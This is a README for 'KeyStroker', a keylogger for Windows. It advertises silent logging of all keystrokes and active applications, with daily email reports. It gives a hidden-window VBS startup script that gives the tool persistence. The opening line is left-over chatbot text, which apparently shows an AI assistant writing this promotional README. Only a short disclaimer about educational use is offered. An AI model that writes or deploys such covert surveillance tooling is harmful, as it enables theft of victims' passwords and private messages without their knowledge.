# stroker
#RIP_BlackAngel
Got it! Here's your updated **README** with the name **KeyStroker**:

---

# 🔑 KeyStroker – Silent Keylogger with Startup Execution 
📌 Overview
KeyStroker is a background keylogger that records all keystrokes, detects active applications while typing, and logs opened programs. It runs silently on Windows startup and sends daily reports via email.

🔹 Features
✔ Logs all keystrokes, including Backspace & Space
✔ Tracks active applications while typing
✔ Monitors opened programs
✔ Silent execution (no console or pop-ups)
✔ Auto-runs on Windows startup
✔ Sends daily logs via email

🔹 Installation & Setup
1️⃣ Enable Auto Startup
Move KeyStroker.exe to a secure location:
sh
Copy
Edit
C:\Users\Public\keystroker.exe
Create a VBS startup script:
Open Notepad and paste the following:
vbscript
Copy
Edit
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\Users\Public\keystroker.exe", 0, False
Save it as:
sh
Copy
Edit
C:\Users\omare\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs
This ensures KeyStroker launches silently on system boot.

🔹 Verifying Execution
Restart your PC
Open Task Manager (Ctrl + Shift + Esc)
Look for keystroker.exe under "Processes"
If it’s running, setup is complete! ✅

🔹 How to Disable KeyStroker
Open Task Manager
Locate keystroker.exe
Click End Task
To remove auto-start, delete:

sh
Copy
Edit
C:\Users\omare\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs
⚠️ Disclaimer: This tool is for educational and ethical purposes only. Unauthorized keylogging may violate privacy laws.

